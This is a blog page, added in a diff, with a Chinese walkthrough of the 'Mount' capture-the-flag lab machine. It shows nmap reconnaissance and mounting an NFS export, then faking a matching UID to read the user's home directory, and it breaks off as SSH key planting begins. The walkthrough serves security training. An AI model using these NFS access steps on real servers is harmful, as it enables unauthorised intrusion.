@@ -1,0 +1,828 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明 QQ群：660930334  一、信息收集1、主机探测123456789101112131415┌──(root㉿kali)-[~&#x2F;miaosec&#x2F;maze-sec&#x2F;mount]└─# nmap -sn 192.168.2.0&#x2F;24                      Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-09-10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mount">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Mount/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明 QQ群：660930334  一、信息收集1、主机探测123456789101112131415┌──(root㉿kali)-[~&#x2F;miaosec&#x2F;maze-sec&#x2F;mount]└─# nmap -sn 192.168.2.0&#x2F;24                      Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-09-10">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-01-09T02:18:07.000Z">
+<meta property="article:modified_time" content="2026-01-09T02:18:56.138Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="NFS服务">
+<meta property="article:tag" content="sudo-reboot">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Mount - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mount"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-09 10:18" pubdate>
+          2026年1月9日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mount</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul>
+<li>QQ群：<code>660930334</code></li>
+</ul>
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap -sn 192.168.2.0/24                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0022s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0023s latency).<br>MAC Address: 08:00:27:9A:56:B0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00093s latency).<br>MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.12 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap --min-rate 10000 -p- 192.168.2.8                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00031s latency).<br>Not shown: 65526 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>79/tcp    open  finger<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>2049/tcp  open  nfs<br>34109/tcp open  unknown<br>37331/tcp open  unknown<br>46281/tcp open  unknown<br>49849/tcp open  unknown<br>MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.21 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22、79、80、111、2049、34109、37331、46281、49849</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,79,80,111,2049,34109,37331,46281,49849 192.168.2.8<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:21 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00074s latency).<br><br>PORT      STATE SERVICE  VERSION<br>22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>79/tcp    open  finger   OpenBSD fingerd (ported to Linux)<br>| finger: \x0D<br>| Welcome to Linux version 4.19.0-27-amd64 at Mount !\x0D<br>| <br>|  11:21:56 up 2 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>| \x0D<br>|_No one logged on.\x0D<br>80/tcp    open  http     Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">111/tcp   open  rpcbind  2-4 (RPC #100000)</span><br><span class="hljs-string">| rpcinfo: </span><br><span class="hljs-string">|   program version    port/proto  service</span><br><span class="hljs-string">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="hljs-string">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/udp6  rpcbind</span><br><span class="hljs-string">|   100003  3           2049/udp   nfs</span><br><span class="hljs-string">|   100003  3           2049/udp6  nfs</span><br><span class="hljs-string">|   100003  3,4         2049/tcp   nfs</span><br><span class="hljs-string">|   100003  3,4         2049/tcp6  nfs</span><br><span class="hljs-string">|   100005  1,2,3      37331/tcp   mountd</span><br><span class="hljs-string">|   100005  1,2,3      50877/tcp6  mountd</span><br><span class="hljs-string">|   100005  1,2,3      52224/udp6  mountd</span><br><span class="hljs-string">|   100005  1,2,3      55192/udp   mountd</span><br><span class="hljs-string">|   100021  1,3,4      37415/udp   nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      41085/tcp6  nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      46281/tcp   nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      57380/udp6  nlockmgr</span><br><span class="hljs-string">|   100227  3           2049/tcp   nfs_acl</span><br><span class="hljs-string">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="hljs-string">|   100227  3           2049/udp   nfs_acl</span><br><span class="hljs-string">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="hljs-string">2049/tcp  open  nfs      3-4 (RPC #100003)</span><br><span class="hljs-string">34109/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="hljs-string">37331/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="hljs-string">46281/tcp open  nlockmgr 1-4 (RPC #100021)</span><br><span class="hljs-string">49849/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="hljs-string">MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: Mount; OSs: Linux, Linux 4.19.0-27-amd64; CPE: cpe:/o:linux:linux_kernel, cpe:/o:linux:linux_kernel:4.19.0-27-amd64</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 19.02 seconds</span><br></code></pre></td></tr></table></figure>
+<ol>
+<li><strong>22端口:</strong> ssh服务</li>
+<li><strong>79端口:</strong> finger服务</li>
+<li><strong>80端口:</strong> http服务</li>
+<li><strong>111端口:</strong> rpcbind服务，版本支持<code>rpcbind 2-4 </code>，<code>rpcbind</code>是NFS中用来进行消息通知的服务，一般开启了rpcbind，会有nfs网络共享的功能，nfs端口是2049</li>
+<li><strong>2049端口:</strong> nfs服务，提供网络文件系统共享服务，支持跨主机文件挂载，默认无加密，可能暴露敏感文件系统</li>
+</ol>
+<h3 id="3-UDP端口扫描"><a href="#3-UDP端口扫描" class="headerlink" title="3.UDP端口扫描"></a>3.UDP端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap -sU --top-ports 100 192.168.2.8                                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:23 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00050s latency).<br>Not shown: 97 closed udp ports (port-unreach)<br>PORT     STATE         SERVICE<br>68/udp   open|filtered dhcpc<br>111/udp  open          rpcbind<br>2049/udp open          nfs<br>MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 109.13 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="3、服务探测"><a href="#3、服务探测" class="headerlink" title="3、服务探测"></a>3、服务探测</h2><h3 id="1-79端口-Finger服务"><a href="#1-79端口-Finger服务" class="headerlink" title="1.79端口-Finger服务"></a>1.79端口-Finger服务</h3><p><strong>Finger</strong> 程序&#x2F;服务用于检索计算机用户的详细信息。通常，提供的信息包括 <strong>用户的登录名、全名</strong>，在某些情况下，还包括其他详细信息。这些额外的详细信息可能包括办公室位置和电话号码（如果可用）、用户登录的时间、非活动时间（闲置时间）、用户最后一次阅读邮件的时间，以及用户的计划和项目文件的内容。</p>
+<p><code>Finger</code>可以访问远程主机的用户信息</p>
+<ul>
+<li>若用户存在，则返回具体的信息<code>Login:...</code></li>
+<li>若用户不存在，则返回<code>no such user</code></li>
+</ul>
+<p>详细信息：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html">https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html</a></li>
+</ul>
+<h3 id="2-80端口-http服务"><a href="#2-80端口-http服务" class="headerlink" title="2.80端口-http服务"></a>2.80端口-http服务</h3><p>访问80端口服务，未发现任何东西，同时进行目录扫描，也没有找到任何有用的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# curl http://192.168.2.8                          <br>index<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-111端口-rpcbind服务"><a href="#3-111端口-rpcbind服务" class="headerlink" title="3.111端口-rpcbind服务"></a>3.111端口-rpcbind服务</h3><p><strong>Portmapper</strong>是一种用于将网络服务端口映射到 <strong>RPC</strong>（远程过程调用）程序编号的服务，通常与 <strong>NFS (Network File System)<strong>、</strong>NIS (Network Information Service)</strong> 和其他 <strong>RPC-based services</strong> 一起使用，以有效管理网络服务。<br>RPC服务的核心端口映射器，负责将RPC程序号（如NFS的100003）映射到实际端口（如2049）</p>
+<p>详细信息：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html">https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html</a></li>
+</ul>
+<h3 id="4-2049端口-nfs服务"><a href="#4-2049端口-nfs服务" class="headerlink" title="4.2049端口-nfs服务"></a>4.2049端口-nfs服务</h3><p><strong>NFS</strong> 是一个为 <strong>客户端&#x2F;服务器</strong> 设计的系统，使用户能够像访问本地目录中的文件一样，无缝地通过网络访问文件。</p>
+<ol>
+<li><p>服务器可挂载的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">showmount -e &lt;IP&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>挂载命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -t nfs [-o vers=2] &lt;ip&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; -o nolock<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>详细信息：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html">https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html</a></li>
+</ul>
+<h1 id="二、渗透测试"><a href="#二、渗透测试" class="headerlink" title="二、渗透测试"></a>二、渗透测试</h1><h2 id="1、NFS服务利用"><a href="#1、NFS服务利用" class="headerlink" title="1、NFS服务利用"></a>1、NFS服务利用</h2><h3 id="1-查看NFS共享"><a href="#1-查看NFS共享" class="headerlink" title="1.查看NFS共享"></a>1.查看NFS共享</h3><p>使用<code>showmount</code>查看可挂载的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# showmount -e 192.168.2.8                                        <br>Export list <span class="hljs-keyword">for</span> 192.168.2.8:<br>/home/ll104567 *<br></code></pre></td></tr></table></figure>
+<p>找到<code>/home</code>目录下面存在用户<code>ll104567</code>下面的文件可以进行挂载</p>
+<h3 id="2-挂载NFS共享"><a href="#2-挂载NFS共享" class="headerlink" title="2.挂载NFS共享"></a>2.挂载NFS共享</h3><ol>
+<li>创建挂载点<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">mkdir</span> mnt   <br></code></pre></td></tr></table></figure></li>
+<li>挂载NFS共享<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# mount -t nfs 192.168.2.8:/home/ll104567 ./mnt -o nolock,rw,vers=3<br></code></pre></td></tr></table></figure></li>
+<li>查看挂载目录的权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">ls</span> -<span class="hljs-built_in">ls</span><br>     4 drwx------ 2 6666 6666      4096  8月21日 11:45 mnt<br></code></pre></td></tr></table></figure></li>
+<li>进入<code>mnt</code>，提示权限不够<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">cd</span> mnt           <br><span class="hljs-built_in">cd</span>: 权限不够: mnt<br></code></pre></td></tr></table></figure></li>
+<li>查看是否已经挂载成功<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">df</span>                                      <br>文件系统                     1K的块     已用     可用 已用% 挂载点<br>...<br>192.168.2.8:/home/ll104567 29801472  2471168 25791232    9% /root/miaosec/maze-sec/mount/mnt<br></code></pre></td></tr></table></figure>
+成功挂载至mnt目录下</li>
+</ol>
+<p>可以看出其实共享已经实现，估计设置了<code>root_squash标志</code>，只是不允许我们去访问，只允许指定的用户ID<code>6666</code>去访问。</p>
+<h3 id="3-NFS权限匹配"><a href="#3-NFS权限匹配" class="headerlink" title="3.NFS权限匹配"></a>3.NFS权限匹配</h3><ol>
+<li><p>创建匹配UID的用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# useradd -u 6666 nfsuser                 <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>切换到用户<code>nfsuser</code> </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(root㉿kali)-[~<span class="hljs-regexp">/miaosec/maze</span>-sec/mount]<br>└─<span class="hljs-comment"># su - nfsuser                                                         </span><br><span class="hljs-symbol">su:</span> <span class="hljs-symbol">warning:</span> cannot change directory to /home/<span class="hljs-symbol">nfsuser:</span> 没有那个文件或目录<br><span class="hljs-variable">$ </span>bash<br>nfsuser<span class="hljs-variable">@kali</span><span class="hljs-symbol">:/root/miaosec/maze-sec/mount</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="2、写入SSH公钥"><a href="#2、写入SSH公钥" class="headerlink" title="2、写入SSH公钥"></a>2、写入SSH公钥</h2><p>挂载成功后，能够成功进入到远程挂载的目录<code>mnt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfsuser@kali:/root/miaosec/maze-sec/mount/mnt$ <span class="hljs-built_in">ls</span> -la<br>总计 20<br>drwx------  2 nfsuser nfsuser 4096  8月21日 11:45 .<br>drwxr-xr-x 11 root    root    4096  9月11日 11:03 ..<br>-rw-r--r--  1 nfsuser nfsuser  220 2019年 4月18日 .bash_logout<br>-rw-r--r--  1 nfsuser nfsuser 3526 2019年 4月18日 .bashrc<br>-rw-r--r--  1 nfsuser nfsuser  807 2019年 4月18日 .profile<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p>生成公钥</p>
